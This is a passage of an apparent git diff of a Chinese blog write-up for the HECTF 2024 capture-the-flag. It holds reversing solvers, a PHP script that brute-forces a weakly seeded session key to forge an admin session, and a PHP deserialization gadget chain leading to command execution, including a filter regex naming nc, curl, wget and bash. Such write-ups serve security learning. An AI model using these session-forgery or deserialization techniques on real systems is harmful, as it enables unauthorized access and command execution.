class="line">        original.append(<span class="built_in">chr</span>(original_char))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(original)</span><br><span class="line"></span><br><span class="line">original_data = reverse_string(dword_55E024F47020, <span class="built_in">len</span>(dword_55E024F47020))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Recovered original data:&quot;</span>, original_data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code class="python">dword_55E024F47020 = [81, 67, 84, 67, 85, 66, 90, 118, 79, 70, 72, 115, 92, 70, 125, 107, 78, 80, 85, 104, 81, 85, 125, 62, 69, 93, 67, 103, 69, 62, 59, 61, 71, 73, 83, 32, 84, 89, 67, 96, 64, 95, 73, 126, 69, 56, 117, 56, 71, 124, 37, 41, 90, 125, 89, 99, 95, 70, 87, 56, 95, 66, 121, 40]
+baset = [121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 43, 47, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120]
 
+for i in baset:
+    print(chr(i), end=&#39;&#39;)
+print()
+
+def reverse_string(v6, length):
+    original = []
+    for i in range(length):
+        original_char = v6[i] ^ (i // 3)
+        original.append(chr(original_char))
+    return &#39;&#39;.join(original)
+
+original_data = reverse_string(dword_55E024F47020, len(dword_55E024F47020))
+print(&quot;Recovered original data:&quot;, original_data)
+</code></pre>
 <p>之后直接换表就行</p>
 <p><img src="/images/2024HECTF/image-20241207235022552.png" alt="image-20241207235022552"></p>
 <h2 id="littleasm"><a href="#littleasm" class="headerlink" title="littleasm"></a><strong>littleasm</strong></h2><p>汇编。重点在encrypt_loop。</p>
@@ -221,25 +331,198 @@
 <p>flag[i+1]^key[(i+1)%3]再+0x8</p>
 <p>flag[i+2]^key[(i)%3]再+0xc</p>
 <p>最后i+3</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">0x6a</span>,<span class="number">0x28</span>,<span class="number">0x3d</span>,<span class="number">0x4e</span>,<span class="number">0x2b</span>,<span class="number">0x5</span>,<span class="number">0x63</span>,<span class="number">0x1e</span>,<span class="number">0xd</span>,<span class="number">0x73</span>,<span class="number">0x10</span>,<span class="number">0x1c</span>,<span class="number">0x73</span>,<span class="number">0x24</span>,<span class="number">0x21</span>,<span class="number">0x73</span>,<span class="number">0x5e</span>,<span class="number">0x21</span>,<span class="number">0x31</span>,<span class="number">0x5d</span>,<span class="number">0x21</span>,<span class="number">0x3f</span>,<span class="number">0xc</span>,<span class="number">0xd</span>,<span class="number">0x6d</span>,<span class="number">0x4c</span>,<span class="number">0x3</span>]</span><br><span class="line">key = <span class="string">&quot;rev&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(data),<span class="number">3</span>):</span><br><span class="line">    data[i]-=<span class="number">0x2c</span></span><br><span class="line">    data[i] = data[i] ^ <span class="built_in">ord</span>(key[(i+<span class="number">2</span>)%<span class="number">3</span>])</span><br><span class="line">    data[i+<span class="number">1</span>]-=<span class="number">0x08</span></span><br><span class="line">    data[i+<span class="number">1</span>] = data[i+<span class="number">1</span>] ^ <span class="built_in">ord</span>(key[(i+<span class="number">1</span>)%<span class="number">3</span>])</span><br><span class="line">    data[i+<span class="number">2</span>]^=<span class="number">0x0c</span></span><br><span class="line">    data[i+<span class="number">2</span>] = data[i+<span class="number">2</span>] ^ <span class="built_in">ord</span>(key[(i)%<span class="number">3</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i&amp;<span class="number">0xff</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment">#HECTF&#123;Ass1mb1y_13_s0_eas7!&#125;</span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="python">data = [0x6a,0x28,0x3d,0x4e,0x2b,0x5,0x63,0x1e,0xd,0x73,0x10,0x1c,0x73,0x24,0x21,0x73,0x5e,0x21,0x31,0x5d,0x21,0x3f,0xc,0xd,0x6d,0x4c,0x3]
+key = &quot;rev&quot;
+for i in range(0,len(data),3):
+    data[i]-=0x2c
+    data[i] = data[i] ^ ord(key[(i+2)%3])
+    data[i+1]-=0x08
+    data[i+1] = data[i+1] ^ ord(key[(i+1)%3])
+    data[i+2]^=0x0c
+    data[i+2] = data[i+2] ^ ord(key[(i)%3])
+for i in data:
+    print(chr(i&amp;0xff),end=&#39;&#39;)
+    #HECTF&#123;Ass1mb1y_13_s0_eas7!&#125;
+</code></pre>
 <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ezWeb"><a href="#ezWeb" class="headerlink" title="ezWeb"></a><strong>ezWeb</strong></h2><p>先是几个比较和一个md5（猜一猜就能猜到），可以如图构造<img src="/images/2024HECTF/image-20241208194857546.png" alt="image-20241208194857546"></p>
 <p>然后用脚本爆破：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设我们已经有了加密数据 session 和目标文件路径</span></span><br><span class="line"><span class="variable">$session</span> = <span class="string">&quot;WqkTPgBeDT1U0xQRA4FUT16V+oides2+++hJEj4+kAAF9j148bj+fFB0fZkzESi4Kh99v/W8XieFk+WjBNIHBfxHXLC8pJjDqpqXeVqIbs4p9rDMPSMrD9Q0qKzwgwmO&quot;</span>;</span><br><span class="line"><span class="variable">$min_seed</span> = <span class="number">1e5</span>;    <span class="comment">// 最小种子值</span></span><br><span class="line"><span class="variable">$max_seed</span> = <span class="number">1e7</span>;  <span class="comment">// 最大种子值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// session_decrypt 函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">session_decrypt</span>(<span class="params"><span class="variable">$session</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$session</span>);</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&#x27;AES-256-CBC&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv_size</span> = <span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$method</span>);</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="number">0</span>, <span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="variable">$enc</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$enc</span>, <span class="variable">$method</span>, <span class="variable">$key</span>, <span class="number">1</span>, <span class="variable">$iv</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断字符串是否全为可打印字符</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_printable</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">ctype_print</span>(<span class="variable">$string</span>);  <span class="comment">// 如果字符串只包含可打印字符，返回 true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 爆破过程：逐个尝试不同的种子</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$seed</span> = <span class="variable">$min_seed</span>; <span class="variable">$seed</span> &lt;= <span class="variable">$max_seed</span>; <span class="variable">$seed</span>++) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);  <span class="comment">// 设置种子</span></span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">rand</span>();    <span class="comment">// 生成密钥</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解密数据</span></span><br><span class="line">    <span class="variable">$decrypted_data</span> = <span class="title function_ invoke__">session_decrypt</span>(<span class="variable">$session</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 仅在解密结果为可打印字符时输出</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$decrypted_data</span> !== <span class="literal">false</span> &amp;&amp; <span class="title function_ invoke__">is_printable</span>(<span class="variable">$decrypted_data</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Found key: <span class="subst">$key</span>\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Decrypted data: <span class="subst">$decrypted_data</span>\n&quot;</span>;</span><br><span class="line">        <span class="comment">//break;  // 找到合适的密钥后退出循环</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+error_reporting(0);
 
+// 假设我们已经有了加密数据 session 和目标文件路径
+$session = &quot;WqkTPgBeDT1U0xQRA4FUT16V+oides2+++hJEj4+kAAF9j148bj+fFB0fZkzESi4Kh99v/W8XieFk+WjBNIHBfxHXLC8pJjDqpqXeVqIbs4p9rDMPSMrD9Q0qKzwgwmO&quot;;
+$min_seed = 1e5;    // 最小种子值
+$max_seed = 1e7;  // 最大种子值
+
+// session_decrypt 函数
+function session_decrypt($session, $key) &#123;
+    $data = base64_decode($session);
+    $method = &#39;AES-256-CBC&#39;;
+    $iv_size = openssl_cipher_iv_length($method);
+    $iv = substr($data, 0, $iv_size);
+    $enc = substr($data, $iv_size);
+    return openssl_decrypt($enc, $method, $key, 1, $iv);
+&#125;
+
+// 判断字符串是否全为可打印字符
+function is_printable($string) &#123;
+    return ctype_print($string);  // 如果字符串只包含可打印字符，返回 true
+&#125;
+
+// 爆破过程：逐个尝试不同的种子
+for ($seed = $min_seed; $seed &lt;= $max_seed; $seed++) &#123;
+    mt_srand($seed);  // 设置种子
+    $key = rand();    // 生成密钥
+
+    // 解密数据
+    $decrypted_data = session_decrypt($session, $key);
+
+    // 仅在解密结果为可打印字符时输出
+    if ($decrypted_data !== false &amp;&amp; is_printable($decrypted_data)) &#123;
+        echo &quot;Found key: $key\n&quot;;
+        echo &quot;Decrypted data: $decrypted_data\n&quot;;
+        //break;  // 找到合适的密钥后退出循环
+    &#125;
+&#125;
+?&gt;
+</code></pre>
 <p>然后再把guest改成admin再加密回去。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">session_decrypt</span>(<span class="params"><span class="variable">$session</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$session</span>);</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&#x27;AES-256-CBC&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv_size</span> = <span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$method</span>);</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="number">0</span>, <span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="variable">$enc</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$enc</span>, <span class="variable">$method</span>, <span class="variable">$key</span>, OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">session_encrypt</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&#x27;AES-256-CBC&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv_size</span> = <span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$method</span>);</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="variable">$enc</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="variable">$method</span>, <span class="variable">$key</span>, OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$iv</span> . <span class="variable">$enc</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="number">1342482596</span>;</span><br><span class="line"><span class="variable">$session</span> = <span class="string">&quot;8U6lUzvnyh/FxHVcG69RWfxdTfu99IUUJ9sVpXKvmbDWry//M3vkV6WdXZ9aIUDg3RIJ4eybxwvxvg/1O0vSqLxUsxbZ+K09rsw5Tl0sl72hhwsn6TbT3YIWtJ5eMuQU&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密数据</span></span><br><span class="line"><span class="variable">$decrypted_data</span> = <span class="title function_ invoke__">session_decrypt</span>(<span class="variable">$session</span>, <span class="variable">$key</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;解密后的数据:\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$decrypted_data</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重新加密数据</span></span><br><span class="line"><span class="variable">$decrypted_data</span> = <span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:4:&quot;role&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$encrypted_session</span> = <span class="title function_ invoke__">session_encrypt</span>(<span class="variable">$decrypted_data</span>, <span class="variable">$key</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;重新加密后的数据:\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$encrypted_session</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+function session_decrypt($session, $key) &#123;
+    $data = base64_decode($session);
+    $method = &#39;AES-256-CBC&#39;;
+    $iv_size = openssl_cipher_iv_length($method);
+    $iv = substr($data, 0, $iv_size);
+    $enc = substr($data, $iv_size);
+    return openssl_decrypt($enc, $method, $key, OPENSSL_RAW_DATA, $iv);
+&#125;
 
+function session_encrypt($data, $key) &#123;
+    $method = &#39;AES-256-CBC&#39;;
+    $iv_size = openssl_cipher_iv_length($method);
+    $iv = openssl_random_pseudo_bytes($iv_size);
+    $enc = openssl_encrypt($data, $method, $key, OPENSSL_RAW_DATA, $iv);
+    return base64_encode($iv . $enc);
+&#125;
+
+$key = 1342482596;
+$session = &quot;8U6lUzvnyh/FxHVcG69RWfxdTfu99IUUJ9sVpXKvmbDWry//M3vkV6WdXZ9aIUDg3RIJ4eybxwvxvg/1O0vSqLxUsxbZ+K09rsw5Tl0sl72hhwsn6TbT3YIWtJ5eMuQU&quot;;
+
+// 解密数据
+$decrypted_data = session_decrypt($session, $key);
+echo &quot;解密后的数据:\n&quot;;
+echo $decrypted_data . &quot;\n&quot;;
+
+// 重新加密数据
+$decrypted_data = &#39;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:4:&quot;role&quot;;s:5:&quot;admin&quot;;&#125;&#39;;
+$encrypted_session = session_encrypt($decrypted_data, $key);
+echo &quot;重新加密后的数据:\n&quot;;
+echo $encrypted_session . &quot;\n&quot;;
+?&gt;
+</code></pre>
 <p>然后重新提交即可得到flag</p>
 <p><img src="/images/2024HECTF/image-20241208195030780.png" alt="image-20241208195030780"></p>
 <h2 id="Are-u-happy"><a href="#Are-u-happy" class="headerlink" title="Are u happy"></a><strong>Are u happy</strong></h2><p>已知flag为HECTF开头，那么只需要把HECTF进行base64编码就能找到base64头，搜一下SEVD就能迅速找到。</p>
 <p><img src="/images/2024HECTF/image-20241207191331253.png" alt="image-20241207191331253"></p>
 <h2 id="baby-unserialize"><a href="#baby-unserialize" class="headerlink" title="baby_unserialize"></a><strong>baby_unserialize</strong></h2><p>反序列化。附上脚本</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="variable">$passwd</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>())&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;msg;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;token === <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class00</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$b</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class01</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$temp</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cls</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;temp = <span class="variable language_">$this</span>-&gt;cls-&gt;<span class="title function_ invoke__">func1</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;temp === <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cls-&gt;str1 = <span class="variable language_">$this</span>-&gt;str3;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;have fun&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class02</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|;|date|bash|\$|\x00|`|env|\?|wget|\&quot;|\&#x27;|\\\|php|id|whoami|=/i&#x27;</span>, <span class="variable">$this</span>-&gt;payload)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;payload.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;fuck you Hacker&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造class00对象，用于触发__set方法</span></span><br><span class="line"><span class="variable">$class00</span> = <span class="keyword">new</span> <span class="title function_ invoke__">class00</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造class01对象，使其cls属性指向class00对象</span></span><br><span class="line"><span class="variable">$class01</span> = <span class="keyword">new</span> <span class="title function_ invoke__">class01</span>();</span><br><span class="line"><span class="variable">$class01</span>-&gt;cls = <span class="variable">$class00</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造class02对象，用于执行命令</span></span><br><span class="line"><span class="variable">$class02</span> = <span class="keyword">new</span> <span class="title function_ invoke__">class02</span>();</span><br><span class="line"><span class="variable">$class02</span>-&gt;payload = <span class="string">&quot;/bin/ca[t] /fla[g] #&quot;</span>; <span class="comment">// 假设flag文件存在且可读</span></span><br><span class="line"><span class="variable">$class01</span>-&gt;str3=<span class="variable">$class02</span>;</span><br><span class="line"><span class="comment">// 构造User对象，使其msg属性包含class01对象，这样在__destruct方法中会触发class01的__tostring方法</span></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;admin&quot;</span>);</span><br><span class="line"><span class="variable">$user</span>-&gt;msg = <span class="variable">$class01</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化User对象</span></span><br><span class="line"><span class="variable">$serializedUser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送POST请求，包含序列化的User对象</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$serializedUser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+class User&#123;
+    public $name;
+    public $passwd;
+    public $msg;
+    public $token ;
+    public function __construct($name,$passwd)&#123;
+        $this-&gt;name = $name;
+        $this-&gt;passwd = $passwd;
+        $this-&gt;token = &quot;admin&quot;;
+    &#125;
 
+
+
+    public function __destruct()&#123;
+        if(!$this-&gt;check())&#123;
+            exit(0);
+        &#125;else&#123;
+            echo $this-&gt;msg;
+        &#125;
+    &#125;
+
+    public function check()&#123;
+        if ($this-&gt;token === &quot;admin&quot;)&#123;
+            return true;
+        &#125;else&#123;
+            return false;
+        &#125;
+    &#125;
+
+&#125;
+
+class class00&#123;
+    public function __call($a,$b)&#123;
+        return 1;
+    &#125;
+    public function __set($a, $b)&#123;
+        $b();
+    &#125;
+
+&#125;
+
+
+class class01&#123;
+    public $temp = 0;
+    public $str3;
+    public $cls;
+
+    public function __tostring()&#123;
+        $this-&gt;temp = $this-&gt;cls-&gt;func1();
+        if ($this-&gt;temp === 1)&#123;
+            $this-&gt;cls-&gt;str1 = $this-&gt;str3;
+        &#125;else&#123;
+            echo &quot;0&quot;;
+            return &quot;0&quot;;
+        &#125;
+
+        return &quot;have fun&quot;;
+    &#125;
+&#125;
+
+class class02&#123;
+    public $payload;
+    public function __invoke()&#123;
